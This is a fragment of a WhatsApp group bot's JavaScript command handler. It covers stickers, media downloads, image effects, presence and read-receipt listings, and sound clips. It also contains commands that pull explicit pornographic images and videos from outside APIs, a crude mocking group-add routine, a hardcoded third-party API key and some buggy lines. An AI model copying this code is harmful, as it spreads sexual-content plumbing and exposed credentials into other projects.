                    let comm = [`group close`,`editinfo close`,`temporalmsg off`,`nsfw off`,`levelingsetting off`,`autosticker off`,`autoreply off`,`welcome off`,`antiflood off`,`antilinkgc off`,`antilinktg off`,`antilinktt off`,`antilinkytvid off`,`antilinkig off`,`antilinkfb off`,`antilinktwit off`,`antilinkall off`,`antiwame off`,`antitoxic off`,`antidoc off`]
                    let listnya = [`GROUP STATUS`,`EDIT GROUP`,`TEMPORAL MESSAGES`,`NSFW`,`LEVELING XP`,`AUTO-STICKER`,`AUTO-REPLY`,`AUTO-GREETING`,`ANTI-GROUPS`,`ANTI-FLOOD`,`ANTI-TELEGRAM`,`ANTI-TIKTOK`,`ANTI-YOUTUBE`,`ANTI-INSTAGRAM`,`ANTI-FACEBOOK`,`ANTI-TWITTER`,`ANTI-LINKS (ALL)`,`ANTI-WA.ME`,`ANTI-TOXIC`,`ANTI-DOC`]
                    let suruh = [`HABILITAR`, `DESHABILITAR`]
                    let startnum = 0; let startnu = 0; let startn = 0; let start = 0
                    let startnumm = 1
                    for (let x of com) {
                        const yy = {title: `${listnya[startnum++]}`,
                    rows: [
                       {
                        title: `${suruh[0]}`,
                        rowId: `${prefix}${x}`
                      },{
                        title: `${suruh[1]}`,
                        rowId: `${prefix}${comm[start++]}`
                      }
                    ]
                   }
                        sections.push(yy)
                    }
                    const sendm =  SkyzeeBOT.sendMessage(
      from, 
      {
       text: `Grupo: ${groupName}\nID: ${m.chat}`,
       footer: botname,
       title: "Group Settings",
       buttonText: "AJUSTES GENERALES",
       sections
      }, { quoted : m }
    )  
}
  break

            case 'delete': case 'del': {
                if (!m.quoted) reply(false)
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) return replay(`The Message Was Not Sent By A Bot!`)
                SkyzeeBOT.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
case 'chatinfo': {
if (!m.quoted) replyErr('Reply Message')
let msg = await m.getQuotedObj()
if (!m.quoted.isBaileys) return replyErr('The message was not sent by a bot!')
let teks = ''
for (let i of msg.userReceipt) {
let read = i.readTimestamp
let unread = i.receiptTimestamp
let waktu = read ? read : unread
teks += `${global.themeemoji} @${i.userJid.split('@')[0]}\n`
teks += ` ┗━${global.themeemoji} *Time :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ${global.themeemoji} *Status :* ${read ? 'Read' : 'Sent'}\n\n`
}
SkyzeeBOT.sendTextWithMentions(m.chat, teks, m)
}
break
case 'q': case 'quoted': {
if (!m.quoted) return replyErr('Reply Message!!')
let wokwol = await SkyzeeBOT.serializeM(await m.getQuotedObj())
if (!wokwol.quoted) return replyErr('The message you replied to does not contain a reply')
await wokwol.quoted.copyNForward(m.chat, true)
}
case 'here': {
if (!m.isGroup) return replay(mess.group)
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
let online = [...Object.keys(store.presences[id]), botNumber]
let liston = 1
SkyzeeBOT.sendText(m.chat, '     「 Online List 」\n\n' + online.map(v => `${liston++} . @` + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
}
break
case 'patrick':
case 'patricksticker': {
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await SkyzeeBOT.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
       case 'attp2': {
           if (!q) return reply(`Example : ${prefix + command} text`)
           await SkyzeeBOT.sendMedia(m.chat, `https://xteam.xyz/${command}?file&text=${q}`, 'hisoka', 'morou', m, {asSticker: true})

         }
         break
case 'attp': {
           if (!text) reply(`Use ${prefix}attp hello\n*Example : ${prefix + command} ${ownername}*` )
           await SkyzeeBOT.sendMedia(m.chat, `https://cililitan.herokuapp.com/api/attp?teks=${text}`, 'Xeon', 'Op', m, {asSticker: true}).catch((err) => reply(mess.error))
         }
         break
case 'ttp': {
           if (!text) return reply(`*Example : ${prefix + command} hello*`)
           await SkyzeeBOT.sendMedia(m.chat, `https://cililitan.herokuapp.com/api/texttopng2?teks=${text}`, 'A L Y A', 'B O T M D', m, {asSticker: true})
         
                     }
                     break
            case 'soundcloud': case 'scdl': {               
                if (!text) return reply(mess.linkm)
                if (!isUrl(args[0]) && !args[0].includes('soundcloud.com')) return reply(`*Not a soundcloud link*`)
                xeonkey.SoundCloud(`${text}`).then(async (data) => {
                    let txt = `*SOUNDCLOUD DOWNLOADER*\n\n`
                    txt += `*${themeemoji}Title :* ${data.title}\n`
                    txt += `*${themeemoji}Quality :* ${data.medias[0].quality}\n`
                    txt += `*${themeemoji}Type :* ${data.medias[0].extension}\n`
                    txt += `*${themeemoji}Size :* ${data.medias[0].formattedSize}\n`
                    txt += `*${themeemoji}Url Source :* ${data.url}\n\n`
                    txt += `*${botname}*`
                buf = await getBuffer(data.thumbnail)   
                SkyzeeBOT.sendMessage(m.chat, { image: { url: data.thumbnail }, jpegThumbnail:buf, caption: `${txt}` }, { quoted: m }).catch((err) => reply(mess.error))    
                SkyzeeBOT.sendMessage(m.chat, { audio: { url: data.medias[0].url }, mimetype: 'audio/mpeg', fileName: data.title+'.m4a' }, { quoted: m })
                }).catch((err) => {
                    reply(mess.error)
                })
            }
            break
case 'dogesticker':
case 'dogestick':
	case 'doge':{
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await SkyzeeBOT.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case 'lovesticker':
case 'lovestick' :{
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/bucin')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await SkyzeeBOT.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await SkyzeeBOT.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break

case 'sticker': case 's': {
	if (/image/.test(mime)) {
		let media = await quoted.download()
		let encmedia = await SkyzeeBOT.sendImageAsSticker(m.chat, media, m, { packname: `Creado por ${pushname}`, author: `${botname}: +7 915 567-60-96` })
		await fs.unlinkSync(encmedia)
	} else if (/video/.test(mime)) {
		if ((quoted.msg || quoted).seconds >= 60) return replyWarn('Por motivos de rendimiento, el stickergif que deseas crear no deben pasar los 60 segundos.')
		let media = await quoted.download()
		let encmedia = await SkyzeeBOT.sendVideoAsSticker(m.chat, media, m, { packname: `Creado por ${pushname}`, author: `${botname}: +7 915 567-60-96` })
		await fs.unlinkSync(encmedia)
	} else replyErr(`No se encontró un video o imagen!`)
} break

case 'swm': case 'take': case 'stickerwm': {
if (!args.join(" ")) return reply(`Example :\nswm ${global.author}|${global.packname}`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (m.quoted.isAnimated === true) {
SkyzeeBOT.downloadAndSaveMediaMessage(quoted, "gifee")
SkyzeeBOT.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await SkyzeeBOT.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maximum 10 seconds!')
let media = await quoted.download()
let encmedia = await SkyzeeBOT.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
await fs.unlinkSync(encmedia)
} else {
reply(`Send Image/Video With Caption ${prefix + command}\nVideo Duration 1-9 Seconds`)
}
}
break
case 'smeme': case 'stickermeme': case 'stickmeme': {
let { TelegraPh } = require('./lib/uploader')
if (!q) return reply(`Send/Reply Photo With Caption ${prefix + command} *text*`)
if (q.includes('|')) return reply(`Send/Reply Photo With Caption ${prefix + command} *text*`)
if (!/image/.test(mime)) return reply(`Send/Reply Photo With Caption ${prefix + command} *text*`)
reply(mess.wait)
mee = await SkyzeeBOT.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/-/${q}.png?background=${mem}`
memek = await SkyzeeBOT.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(memek)
}
break
            case 'ebinary': {
            if (!m.quoted.text && !text) return replay(`Reply Text With Caption ${prefix + command}`)
            let { eBinary } = require('./lib/binary')
            let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text
            let eb = await eBinary(teks)
            reply(eb)
        }
        break
            case 'dbinary': {
            if (!m.quoted.text && !text) return replay(`Reply Text With Caption ${prefix + command}`)
            let { dBinary } = require('./lib/binary')
            let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text
            let db = await dBinary(teks)
            reply(db)
        }
        break
case 'masturbation': case 'jahy': case 'hentai': case 'glasses': case 'gangbang': case 'foot': 
case 'femdom': case 'cum': case 'ero': case 'cuckold': case 'blowjob': case 'bdsm': 
case 'ahegao': case 'ass': case 'orgy': case 'panties': case 'pussy': case 'thighs': case 'yuri': case 'tentacles':
if (!m.isGroup) return replay(mess.group)
if (!isnsfw) return reply(mess.nsfw)
try{
reply(mess.wait)
NoHorny = await fetchJson(`https://myselfff.herokuapp.com/docs/nsfw/${command}`)
YesHorny = await getBuffer(NoHorny.result)
await SkyzeeBOT.sendMessage(from, {image:YesHorny},{quoted:m})
} catch (e) {
    replay("Error")
}	
break
case 'sepsinfapfallido':
    buttons = [
        { buttonId: `${prefix + command}.si`, buttonText: { displayText: 'Sí' }, type: 1 },
        { buttonId: `${prefix + command}.no`, buttonText: { displayText: 'No' }, type: 1 }
    ]
    if (!notButtons) SkyzeeBOT.sendButtonText(m.chat, buttons, `¿Perdiste septiembre sin fap?`, m)
    if (notButtons) SkyzeeBOT.sendText(m.chat, `¿Perdiste septiembre sin fap?\n\n${buttons[0].buttonId}\n${buttons[1].buttonId}`, m)
break
case 'sepsinfapfallido.si':
    pic = [ '1.jpg', '2.jpg', '3.jpg', '4.jpg' ]
    await SkyzeeBOT.groupParticipantsUpdate("120363040914777699@g.us", [m.sender], 'add').catch(err => { return reply('YA ESTÁS EN EL GRUPO PAJÍN') })
    await SkyzeeBOT.sendImage(m.chat, './XeonMedia/image/fallido' + pickRandom(pic), `SOS UN PAJINN KKKKKKKK\nAHORA ENTRASTE AL GRUPO DE LOS GORDOS PAJINES DONDE NO TIENEN NADA MAS QUE HACER QUE MIRAR PORNO LAS 24/7\n\nmás suerte el próximo año wachin...`, m)
break
case 'sepsinfapfallido.no':
    pic = [ '1.jpg', '2.jpg', '3.jpg', '4.jpg' ]
    await SkyzeeBOT.sendImage(m.chat, './XeonMedia/image/respeto' + pickRandom(pic), `Me llenas de orgullo soldado, llevas combatiendo correctamente esta guerra comenzada hace ${new Date().getDate()} días, aún quedan ${30 - new Date().getDate()} días más... MUCHA SUERTE SOLDADO!`, m)
break
case 'hentaivid': case 'hentaivideo': {
    teks = [
        `QUE PASÓ PIBE? PERDISTE EL #SepNoFap?? Mmmm... ojo pibee, esta guerra recién comienza. A LUCHARLA! ÁNIMO CRACK!`,
        `YA PERDISTE SEPTIEMBRE?? Impresionante, buen intento pajín, vení por acá para no tentar a los demás soldados que deben estar en una misión compleja: *${prefix}sepSinFapFallido*`
    ]
    if (from !== "120363040914777699@g.us") return SkyzeeBOT.sendImage(m.chat, './XeonMedia/image/sepnofap.jpeg', pickRandom(teks))
// 	if (!m.isGroup) return replay(mess.group)
// if (!isnsfw) return reply(mess.nsfw)
                reply(mess.wait)
                anu = await hentai()
                result912 = anu[Math.floor(Math.random(), anu.length)]
                SkyzeeBOT.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}` }, { quoted: m })
            }
            break
case 'happy': case 'blowjob': case 'glomp': case 'smug': case 'blush': case 'awoo': case 'wave': case 'smile': case 'poke': case 'wink': case 'bonk': case 'yeet': case 'bite': case 'lick': case 'kill': case 'cry': case 'neko': case 'nom': case 'dance': case 'cringe': case 'highfive': case 'handhold': case 'megumin': case 'shinobu': case 'waifu':
    waifudd = await axios.get(`https://api.waifu.pics/sfw/${command}`)
    textButton = [`more more more more more`, `owo?`, `pasa mas papu`, `osi osi`]
    textCaption = [`regalito pa los fans`, `acá tienes papu`, `esto buscabas??`, `para ti :3`]
    buttons = [{buttonId: `${prefix + command}`, buttonText: {displayText: pickRandom(textButton)}, type: 1}]
    buttonMessage = {
        image: {url:waifudd.data.url},
        caption: pickRandom(textCaption),
        buttons: buttons,
        headerType: 1
    }
    if (notButtons || from.includes("@s.whatsapp.net")) delete buttonMessage.buttons
    await SkyzeeBOT.sendMessage(m.chat, buttonMessage, { quoted:m }).catch(err => { return('Error!') })
break
case 'htrap': case 'hneko': case 'hwaifu':
    if (!m.isGroup) return replay(mess.group)
    if (!isnsfw) return reply(mess.nsfw)
    waifudd = await axios.get(`https://api.waifu.pics/nsfw/${command.slice(1)}`)
    textButton = [`quiero más prro >:v`, `oie k rrico`, `more more more more more`]
    textCaption = [`regalito pa los fans`, `acá tienes papu`, `esto buscabas??`, `para ti :3`]
    buttons = [{buttonId: `${prefix + command}`, buttonText: {displayText: pickRandom(textButton)}, type: 1}]
    buttonMessage = {
        image: {url:waifudd.data.url},
        caption: pickRandom(textCaption),
        buttons: buttons,
        headerType: 1
    }
    if (notButtons || from.includes("@s.whatsapp.net")) delete buttonMessage.buttons
    await SkyzeeBOT.sendMessage(m.chat, buttonMessage, { quoted:m }).catch(err => { return('Error!') })
break
case 'gasm': case 'fox_girl': case 'cuddle': case 'slap': case 'pat': case 'hug': case 'kiss': case 'spank': case 'woof': case '8ball': case 'goose': case 'gecg': case 'feed': case 'avatar': case 'lizard': case 'meow': case 'tickle':						
    waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
    textButton = [`more more more more more`, `owo?`, `pasa mas papu`, `osi osi`]
    textCaption = [`regalito pa los fans`, `acá tienes papu`, `esto buscabas??`, `para ti :3`]
    buttons = [{buttonId: `${prefix + command}`, buttonText: {displayText: pickRandom(textButton)}, type: 1}]
    buttonMessage = {
        image: {url:waifudd.data.url},
        caption: pickRandom(textCaption),
        footer: `${global.botname}`,
        buttons: buttons,
        headerType: 4
    }
    if (notButtons || from.includes("@s.whatsapp.net")) delete buttonMessage.buttons
    await SkyzeeBOT.sendMessage(m.chat, buttonMessage, { quoted:m }).catch(err => { return('Error!') })
break
case 'animewall': case 'animewallpaper2':
reply(mess.wait)						
const { AnimeWallpaper } =require("anime-wallpaper")
if(!q) return reply('What wallpaper do you want?')
const wall = new AnimeWallpaper();
    const pages = [1,2,3,4];
        const random=pages[Math.floor(Math.random() * pages.length)]
        const wallpaper = await wall
            .getAnimeWall4({ title: q, type: "sfw", page: pages })
            .catch(() => null);
const i = Math.floor(Math.random() * wallpaper.length);
var walb = [
        {buttonId: `.${command} ${q}`, buttonText: {displayText: `Next ✨`}, type: 1},        
        ]
      let wal = {
       image: {url:wallpaper[i].image},
       caption: `*Query :* ${q}`,
      footer: `${global.botname}`,
      buttons: walb,
      headerType: 4
      }     
      if (notButtons || from.includes("@s.whatsapp.net")) delete wal.buttons
            await SkyzeeBOT.sendMessage(m.chat, wal,{ quoted:m }).catch(err => {
                    return('Error!')
                })
//SkyzeeBOT.sendMessage(m.chat,{image:{url:wallpaper[i].image},caption:`*Query :* ${q}`})            
break
case 's.cry':case 's.kill':case 's.hug':case 's.pat':case 's.lick':case 's.kiss':case 's.bite':case 's.yeet':case 's.neko':case 's.bully':case 's.bonk':case 's.wink':case 's.poke':case 's.nom':case 's.slap':case 's.smile':case 's.wave':case 's.awoo':case 's.blush':case 's.smug':case 's.glomp':case 's.happy':case 's.dance':case 's.cringe':case 's.cuddle':case 's.highfive':case 's.shinobu':case 's.megumin':case 's.handhold':
    axios.get(`https://api.waifu.pics/sfw/${command}`).then(({data}) => {
        SkyzeeBOT.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
	})
break
case 'naruto':
				reply(mess.wait)
			    var query = ["naruto hd","naruto boruto","naruto sasuke", "naruto aesthetic", "naruto aesthetic"]
                var data = await pinterest(pickRandom(query))
				var but = [{buttonId: `${prefix}naruto`, buttonText: { displayText: "Next➡️" }, type: 1 }]
                buttonMessage = {
                    caption: `Here you go!`,
                    image: { url: pickRandom(data.result) },
                    buttons: but,
                    footer: `${botname}`
                }
                if (notButtons || from.includes("@s.whatsapp.net")) delete buttonMessage.buttons
				SkyzeeBOT.sendMessage(from, buttonMessage, { quoted: m })
 			    break
case 'yaoi':
				reply(mess.wait)
			    var query = ["yaoi","yaoi aesthetic","yaoi hd","yaoi ganteng"]
                var data = await pinterest(pickRandom(query))
				var but = [{buttonId: `${prefix + command}`, buttonText: { displayText: "Next➡️" }, type: 1 }]
                buttonMessage = {
                    caption: "Here you go!",
                    image: { url: pickRandom(data.result) },
                    buttons: but,
                    footer: `${botname}`
                }
                if (notButtons || from.includes("@s.whatsapp.net")) delete buttonMessage.buttons
				SkyzeeBOT.sendMessage(from, buttonMessage, { quoted: m })
 			    break
case 'coffee': case 'kopi': {
            let buttons = [
                    {buttonId: `${prefix}coffee`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: 'https://coffee.alexflipnote.dev/random' },
                    caption: `Here you go!`,
                    footer: `${botname}`,
                    buttons: buttons,
                    headerType: 4
                }
                if (notButtons || from.includes("@s.whatsapp.net")) delete buttonMessage.buttons
                SkyzeeBOT.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case 'zippyshare': {
if (!q) return reply(mess.linkm)
if (!isUrl(args[0]) && !args[0].includes('zippyshare.com')) return reply(`The link is not a zippyshare link`)
anu = await fetchJson(`https://violetics.pw/api/downloader/zippyshare?apikey=df7d-425a-3bc8&url=${q}`)
m.reply(`*${util.format(anu)}*`)
linkyke = await getBuffer(anu.result.dlink)
SkyzeeBOT.sendMessage(m.chat, {document: linkyke, mimetype: 'application/zip', fileName: `${anu.result.filename}`}, {quoted:m}).catch ((err) => reply(mess.error))     
}
break
case 'savefrom': {
  if (!q) return m.reply(`Failed to download media and send audio ${prefix + command} url link`) 
  if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return reply(`The link you provided is invalid`)
  let noh = require('@bochilteam/scraper')                
  noh.savefrom(`${q}`).then(async (data) => {
  let sections = []   
  for (let i of data.url) {
  const list = {
    title: `${i.type}`,
    rows: [{
        title: `Quality ${i.subname}`, 
        rowId: `${prefix}get ${q}`,
        description: `${data.hosting}`	     
    }]
}
 sections.push(list)   
}
    buttonMessage = {
       text: `${data.meta.title} *Here is the list of videos, click the button below to choose*`,
       footer: `${botname}`,
       title: "*SAVE FROM*",
       buttonText: "CLICK HERE",
       sections
    }
  const sendm =  SkyzeeBOT.sendMessage(m.chat, buttonMessage, { quoted : m })
    }).catch((err) => { reply(mess.error) })
            }
            break
case 'jail': case 'pixelate': case 'blur': case 'imagesketch': case 'triggeredwebp': case 'shit': case 'burn': case 'invert': case 'wanted': case 'rip': {
	            if (!/image/.test(mime)) return reply(`*Send/Reply Image With Caption* ${prefix + command}`)
	        	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader2')
                let media = await SkyzeeBOT.downloadAndSaveMediaMessage(quoted)                
                let anu = await TelegraPh(media)
                let buf = await getBuffer(`https://cililitan.herokuapp.com/api/${command}?url=${anu}`)
                SkyzeeBOT.sendMessage(m.chat, { image: buf, caption: `Made by ${botname}` }, { quoted: m}).catch ((err) => reply(mess.error))
                }
                break
case 'gayeffect': {
	            if (!/image/.test(mime)) return reply(`*Send/Reply Image With Caption* ${prefix + command}`)
	        	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader2')
                let media = await SkyzeeBOT.downloadAndSaveMediaMessage(quoted)                
                let anu = await TelegraPh(media)
                let buf = await getBuffer(`https://cililitan.herokuapp.com/api/gay?url=${anu}`)
                SkyzeeBOT.sendMessage(m.chat, { image: buf, caption: `Made by ${botname}` }, { quoted: m}).catch ((err) => reply(mess.error))
                }
                break
case 'deleteeffect': {
	            if (!/image/.test(mime)) return reply(`*Send/Reply Image With Caption* ${prefix + command}`)
	        	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader2')
                let media = await SkyzeeBOT.downloadAndSaveMediaMessage(quoted)                
                let anu = await TelegraPh(media)
                let buf = await getBuffer(`https://cililitan.herokuapp.com/api/delete?url=${anu}`)
                SkyzeeBOT.sendMessage(m.chat, { image: buf, caption: `Made by ${botname}` }, { quoted: m}).catch ((err) => reply(mess.error))
                }
                break
case 'framed': {
	            if (!/image/.test(mime)) return reply(`*Send/Reply Image With Caption* ${prefix + command}`)
	        	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader2')
                let media = await SkyzeeBOT.downloadAndSaveMediaMessage(quoted)                
                let anu = await TelegraPh(media)
                let buf = await getBuffer(`https://cililitan.herokuapp.com/api/fotojatoh?url=${anu}`)
                SkyzeeBOT.sendMessage(m.chat, { image: buf, caption: `Made by ${botname}` }, { quoted: m}).catch ((err) => reply(mess.error))
                }
                break
case 'beautifuleffect': {
	            if (!/image/.test(mime)) return reply(`*Send/Reply Image With Caption* ${prefix + command}`)
	        	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader2')
                let media = await SkyzeeBOT.downloadAndSaveMediaMessage(quoted)                
                let anu = await TelegraPh(media)
                let buf = await getBuffer(`https://cililitan.herokuapp.com/api/beautiful?url=${anu}`)
                SkyzeeBOT.sendMessage(m.chat, { image: buf, caption: `Made by ${botname}` }, { quoted: m}).catch ((err) => reply(mess.error))
                }
                break
            case 'readmore': {
                if (!text) return reply(`Example : ${prefix + command} halo gaes`)
                anu = await fetchJson(`https://cililitan.herokuapp.com/api/readmore?teks=${text}`)
               reply(`${anu.result}`)
            }
            break
case 'toviewonce': case 'toonce': {
        if (!quoted) return reply(`Reply image`)
        if (/image/.test(mime)) {
anu = await SkyzeeBOT.downloadAndSaveMediaMessage(quoted)
SkyzeeBOT.sendMessage(m.chat, {image: {url: anu},viewOnce : true},{quoted: m })
        } else if (/video/.test(mime)) {
        anu = await SkyzeeBOT.downloadAndSaveMediaMessage(quoted)
        SkyzeeBOT.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: m })
        }
        }
        break
        case 'tinyurl': {
            reply(mess.wait)
            try {
              anu = await axios.get(`https://tinyurl.com/api-create.php?url=${q}`)
              reply(`${anu.data} here you go!`)
              } catch (e) {
              emror = String(e)
              reply(`${e}`)
            }
        }
        break
case 'fliptext': {
if (args.length < 1) return replay(`Example:\n${prefix}fliptext ${ownername}`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
replay(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
}
break
case 'translate': case 'trans': {
if (!args.join(" ")) return replay("The text?")
tes = await fetchJson (`https://megayaa.herokuapp.com/api/translate?to=en&kata=${args.join(" ")}`)
Infoo = tes.info
Detek = tes.translate
replay(`🌐Translate : ${Detek}\n📘Results : ${Infoo}`)
}
break
case 'sound1': case 'sound2': case 'sound3': case 'sound4': case 'sound5': case 'sound6': case 'sound7': case 'sound8': case 'sound9': case 'sound10': case 'sound11': case 'sound12': case 'sound13': case 'sound14': case 'sound15': case 'sound16': case 'sound17': case 'sound18': case 'sound19': case 'sound20': case 'sound21': case 'sound22': case 'sound23': case 'sound24': case 'sound25': case 'sound26': case 'sound27': case 'sound28': case 'sound29': case 'sound30': case 'sound31': case 'sound32': case 'sound33': case 'sound34': case 'sound35': case 'sound36': case 'sound37': case 'sound38': case 'sound39': case 'sound40': case 'sound41': case 'sound42': case 'sound43': case 'sound44': case 'sound45': case 'sound46': case 'sound47': case 'sound48': case 'sound49': case 'sound50': case 'sound51': case 'sound52': case 'sound53': case 'sound54': case 'sound55': case 'sound56': case 'sound57': case 'sound58': case 'sound59': case 'sound60': case 'sound61': case 'sound62': case 'sound63': case 'sound64': case 'sound65': case 'sound66': case 'sound67': case 'sound68': case 'sound69': case 'sound70': case 'sound71': case 'sound72': case 'sound73': case 'sound74': case 'sound75': case 'sound76': case 'sound77': case 'sound78': case 'sound79': case 'sound80': case 'sound81': case 'sound82': case 'sound83': case 'sound84': case 'sound85': case 'sound86': case 'sound87': case 'sound88': case 'sound89': case 'sound90': case 'sound91': case 'sound92': case 'sound93': case 'sound94': case 'sound95': case 'sound96': case 'sound97': case 'sound98': case 'sound99': case 'sound100': case 'sound101': case 'sound102': case 'sound103': case 'sound104': case 'sound105': case 'sound106': case 'sound107': case 'sound108': case 'sound109': case 'sound110': case 'sound111': case 'sound112': case 'sound113': case 'sound114': case 'sound115': case 'sound116': case 'sound117': case 'sound118': case 'sound119': case 'sound120': case 'sound121': case 'sound122': case 'sound123': case 'sound124': case 'sound125': case 'sound126': case 'sound127': case 'sound128': case 'sound129': case 'sound130': case 'sound131': case 'sound132': case 'sound133': case 'sound134': case 'sound135': case 'sound136': case 'sound137': case 'sound138': case 'sound139': case 'sound140': case 'sound141': case 'sound142': case 'sound143': case 'sound144': case 'sound145': case 'sound146': case 'sound147': case 'sound148': case 'sound149': case 'sound150': case 'sound151': case 'sound152': case 'sound153': case 'sound154': case 'sound155': case 'sound156': case 'sound157': case 'sound158': case 'sound159': case 'sound160': case 'sound161':
    xeony_buffer = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
    await SkyzeeBOT.sendMessage(m.chat, { audio: xeony_buffer, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
case 'textmaker': {
             if (!args[0]) return replyErr(`No se especificó un estilo y un texto!\n\nUso correcto:\n*${prefix}textmaker _{estilo} {texto}_*`)
             if (!args[1]) return replyErr(`No se especificó un texto!\n\nUso correcto:\n*${prefix}textmaker _{estilo} {texto}_*`)
             replyNone(mess.wait)
             let link
             if (/candy/.test(args[0])) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
            else if (/christmas/.test(args[0])) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
            else if (/3dchristmas/.test(args[0])) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
            else if (/sparklechristmas/.test(args[0])) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
            else if (/deepsea/.test(args[0])) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
            else if (/scifi/.test(args[0])) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
            else if (/rainbow/.test(args[0])) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
            else if (/waterpipe/.test(args[0])) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
            else if (/spooky/.test(args[0])) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
            else if (/pencil/.test(args[0])) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
            else if (/circuit/.test(args[0])) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
            else if (/discovery/.test(args[0])) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
            else if (/metalic/.test(args[0])) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
            else if (/fiction/.test(args[0])) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
            else if (/demon/.test(args[0])) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
            else if (/transformer/.test(args[0])) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
            else if (/berry/.test(args[0])) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
            else if (/thunder/.test(args[0])) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
            else if (/magma/.test(args[0])) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
            else if (/3dstone2/.test(args[0])) link = 'https://textpro.me/create-a-3d-stone-text-effect-online-for-free-1073.html'
            else if (/neonlight/.test(args[0])) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
            else if (/glitch/.test(args[0])) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
            else if (/harrypotter/.test(args[0])) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
            else if (/brokenglass/.test(args[0])) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
            else if (/papercut/.test(args[0])) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
            else if (/watercolor/.test(args[0])) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
            else if (/multicolor/.test(args[0])) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
            else if (/neondevil/.test(args[0])) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
